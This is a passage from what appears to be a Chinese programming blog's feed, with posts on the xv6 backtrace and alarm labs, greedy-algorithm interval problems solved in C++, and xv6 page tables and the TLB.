class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64</span><br><span class="line"><span class="title function_">r_fp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mv %0, s0&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sleep</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  backtrace();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>printf.c</code>定义我们的<code>backtrace()</code>函数，由于xv6的栈只分配了一页的空间，我们可以直接获取栈底（页开始）的地址，当<code>ret_addr</code>大于栈底时（栈是反向增长的），即已完成遍历。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//defs.h</span></span><br><span class="line"><span class="type">void</span>            <span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf.c</span></span><br><span class="line"><span class="type">void</span> </span><br><span class="line"><span class="title function_">backtrace</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;backtrace:\n&quot;</span>);</span><br><span class="line">  uint64 fp = r_fp();</span><br><span class="line">  uint64 base = PGROUNDUP(fp);</span><br><span class="line">  <span class="keyword">while</span>(fp &lt; base)</span><br><span class="line">  &#123;</span><br><span class="line">    uint64 Ret_addr = *(uint64*)(fp <span class="number">-8</span>);<span class="comment">//返回地址</span></span><br><span class="line">    fp = *(uint64*)(fp <span class="number">-16</span>);<span class="comment">//上一个fp指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, Ret_addr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h3><h4 id="test0"><a href="#test0" class="headerlink" title="test0"></a>test0</h4><p>按照添加系统调用的流程，添加系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//usys.pl</span></span><br><span class="line">entry(<span class="string">&quot;sigalarm&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sigreturn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//usys.h</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigalarm</span><span class="params">(<span class="type">int</span> ticks, <span class="type">void</span> (*handler)())</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigreturn</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//syscall.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sigalarm 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sigreturn 23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//syscall.c</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">...</span><br><span class="line">[SYS_sigalarm] sys_sigalarm,</span><br><span class="line">[SYS_sigreturn] sys_sigreturn,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了实现定时alram，我们需要在proc添加字段来保存handler函数、tick次数和触发handler的ticks次数。同时在创建进程时对其进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  uint64 handler_addr;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  <span class="type">int</span> tickcount;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">userinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">  p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">  p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">  p-&gt;handler_addr = <span class="number">0</span>;</span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们添加<code>sys_sigalarm</code>和<code>sys_sigreturn</code>函数，由于test0只是测试handler，我们可以将<code>sys_sigreturn</code>直接返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  uint64 handler;</span><br><span class="line">    <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;ticks) &lt; <span class="number">0</span>||argaddr(<span class="number">1</span>, &amp;handler) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">   p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">   p-&gt;ticks = ticks;</span><br><span class="line">   p-&gt;handler_addr = handler;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改时钟中断，每次中断都将tick加1，当满足<code>tick==ticks</code>时调用<code>handler</code>，并将<code>tick</code>归0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span>(p-&gt;ticks)&#123;</span><br><span class="line">        p-&gt;tickcount ++;</span><br><span class="line">         <span class="keyword">if</span>(p-&gt;tickcount == p-&gt;ticks)</span><br><span class="line">          &#123;</span><br><span class="line">            p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">            p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">             p-&gt;trapframe-&gt;epc = p-&gt;handler_addr;</span><br><span class="line">           &#125;</span><br><span class="line">          </span><br><span class="line">     &#125;</span><br><span class="line">     yield();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><p>进入test1，要求我们要恢复寄存器状态，即保存<code>trapframe</code>，并在调用<code>sys_sigreturn</code>时恢复寄存器。因此我们要添加<code>old_trapframe</code>字段，并在初始化时分配内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">...</span><br><span class="line">  uint64 handler_addr;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  <span class="type">int</span> tickcount;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">old_trapframe</span>;</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line"> ...</span><br><span class="line">  <span class="comment">// Allocate a trapframe page.</span></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;trapframe = (<span class="keyword">struct</span> trapframe *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>((p-&gt;old_trapframe = (<span class="keyword">struct</span> trapframe *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着修改<code>sys_sigreturn</code>,恢复寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">   *(p-&gt;trapframe) = *(p-&gt;old_trapframe); <span class="comment">//注意这里是深拷贝，将所有寄存器都进行复制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进入handler函数前保存寄存器。为什么不在调用<code>sys_sigalarm()</code>时就保存呢？因为我们设置中断，进程还是照常执行，只不过每隔tick时钟执行一次handler。寄存器的状态显然不一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;ticks)&#123;</span><br><span class="line">         p-&gt;tickcount ++;</span><br><span class="line">          <span class="keyword">if</span>(p-&gt;tickcount &gt;= p-&gt;ticks)</span><br><span class="line">           &#123;</span><br><span class="line">              p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">              *p-&gt;old_trapframe = *p-&gt;trapframe; </span><br><span class="line">              p-&gt;trapframe-&gt;epc = p-&gt;handler_addr;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">      &#125;</span><br><span class="line">      yield();</span><br><span class="line">    &#125;</span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>test2测试的是当handler函数执行所需的时间大于达到<code>tick==ticks</code>的时间，此时handler被重入，而我们的中断处理程序是不允许重入的（若重入则不仅保存的寄存器数据被覆盖，handler还会陷入死循环），因此我们需要添加一个字段防止这种事情发生。</p><p>添加<code>is_alarm</code>字段，当handler执行时，另一个handler将不会被调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">userinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">  p-&gt;ticks = <span class="number">0</span>;</span><br><span class="line">  p-&gt;handler_addr = <span class="number">0</span>;</span><br><span class="line">  p-&gt;is_alarm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改<code>sys_sigalarm</code>和<code>sys_sigreturn</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigalarm</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ticks;</span><br><span class="line">  uint64 handler;</span><br><span class="line">    <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;ticks) &lt; <span class="number">0</span>||argaddr(<span class="number">1</span>, &amp;handler) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">   p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">   p-&gt;ticks = ticks;</span><br><span class="line">   p-&gt;handler_addr = handler;</span><br><span class="line">   p-&gt;is_alarm = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sigreturn</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">   *(p-&gt;trapframe) = *(p-&gt;old_trapframe); </span><br><span class="line">  p-&gt;is_alarm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改时钟中断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ticks)&#123;</span><br><span class="line">       p-&gt;tickcount ++;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;tickcount &gt;= p-&gt;ticks &amp;&amp;p-&gt;is_alarm == <span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">            p-&gt;tickcount = <span class="number">0</span>;</span><br><span class="line">            *p-&gt;old_trapframe = *p-&gt;trapframe; </span><br><span class="line">            p-&gt;is_alarm = <span class="number">1</span>;</span><br><span class="line">            p-&gt;trapframe-&gt;epc = p-&gt;handler_addr;</span><br><span class="line">            </span><br><span class="line">          &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    yield();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心</title>
      <link href="/2024/07/01/%E7%AE%97%E6%B3%95/%E8%B4%AA%E5%BF%83/"/>
      <url>/2024/07/01/%E7%AE%97%E6%B3%95/%E8%B4%AA%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<p>畜栏预定</p><h1 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h1><p>TODO：畜栏预定、雷达设备    </p><p>贪心题的要点：</p><ul><li>思考、证明通过该方法得到的解是最优解，可用<code>res &lt;= ans，res &gt;= ans   ——&gt; res == ans</code>。</li></ul><h3 id="acwing905"><a href="#acwing905" class="headerlink" title="acwing905"></a>acwing905</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240708112933313.png" alt="image-20240708112933313"></p><p>我们通过重载运算符，设置为通过右端点从小到大排序，获取第一个右端点最大值为max值，若其他线段的左端点小于该max值，则continue。若大于则更新max值，res++。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span> &#123;</span><br><span class="line">  <span class="type">int</span> lef;</span><br><span class="line">  <span class="type">int</span> rig;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> st &amp;tmp) <span class="type">const</span> &#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;rig &lt; tmp.rig; &#125;</span><br><span class="line">&#125; st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;     <span class="comment">//别忘了输入n Qwq</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    cin &gt;&gt; st[i].lef &gt;&gt; st[i].rig;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(st, st + n);</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> max = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (st[i].lef &gt; max) &#123;</span><br><span class="line">      max = st[i].rig;</span><br><span class="line">      res++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="acwing908"><a href="#acwing908" class="headerlink" title="acwing908"></a>acwing908</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240708150553457.png" alt="image-20240708150553457"></p><p>这题可以采用右端点排序，也可以采用左端点排序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span>&#123;</span><br><span class="line">    <span class="type">int</span> lef;</span><br><span class="line">    <span class="type">int</span> rig;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> st&amp; tmp)  <span class="type">const</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;rig &lt; tmp.rig;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;st[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; st[i].lef &gt;&gt; st[i].rig; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(st,st + n);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> rigmax  = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(st[i].lef &gt; rigmax)</span><br><span class="line">        &#123;</span><br><span class="line">            rigmax = st[i].rig;</span><br><span class="line">            res ++;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x3</title>
      <link href="/2024/06/30/OS/xv6_0x3/"/>
      <url>/2024/06/30/OS/xv6_0x3/</url>
      
        <content type="html"><![CDATA[<h1 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h1><h4 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h4><ul><li><p>trampoline被映射两次用以跳转和跳出内核。</p></li><li><p>每个cpu拥有各自的kernel stack，相当于存在各自的kernel线程</p></li><li>内核物理地址与虚拟地址相同。</li><li>设备被映射到低地址</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240711221001170.png" alt="image-20240711221001170"></p><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>页表保存于内存中，用于将虚拟内存转化为对应的物理内存。</p><p>虚拟内存</p><ul><li><p>在xv6里，只使用了39个bit</p></li><li><p>Offset：12bit，指向4096字节的某一个，此处虚拟内存与物理内存值相同。</p></li><li><p>L2，L1，L0，分别使用9bit索引表单</p></li><li><p>SATP寄存器存储页表的物理地址(即L2第0号索引)。</p></li><li><p>在切换SATP寄存器后要对TLB进行刷新，否则会索引到错误地址</p></li></ul><p>物理内存：</p><ul><li>riscv支持使用56bit索引物理内存</li><li><p>Offset：12bit，指向4096字节的某一个，此处虚拟内存与物理内存值相同。</p></li><li><p>PPN由L0获得，占44bit。</p></li></ul><p>使用三级页表的优点：</p><ul><li>极大节省内存空间的同时又不太影响性能。</li><li>硬件可以帮助我们完成地址翻译，但是我们还是需要<code>walk函数</code>转换地址实现内核功能。</li><li>因为内核虚拟地址和实际的物理地址是相同的，所以通过<code>walk</code></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240702015409877.png" alt="image-20240702015409877"></p><h4 id="页表缓存"><a href="#页表缓存" class="headerlink" title="页表缓存"></a>页表缓存</h4><p>处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。这个缓存被称为：Translation Lookside Buffer（TLB）。</p><p>TLB在切换页表后要清空，否则地址翻译可能会出错。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="Speed-up-system-calls（2021）"><a href="#Speed-up-system-calls（2021）" class="headerlink" title="Speed up system calls（2021）"></a>Speed up system calls（2021）</h3><p>注意21年前的lab是没有这个实验的。</p><p>主要是要理解创建进程时的内存映射过程，这里搞了很久，最后看题解发现其实很简单…来看一下吧</p><p>lab要求是加快getpid()系统调用的速度，那么该怎么加快呢？我们知道，pid在进程的运行周期是不会改变的，因此可以将内存                                                                  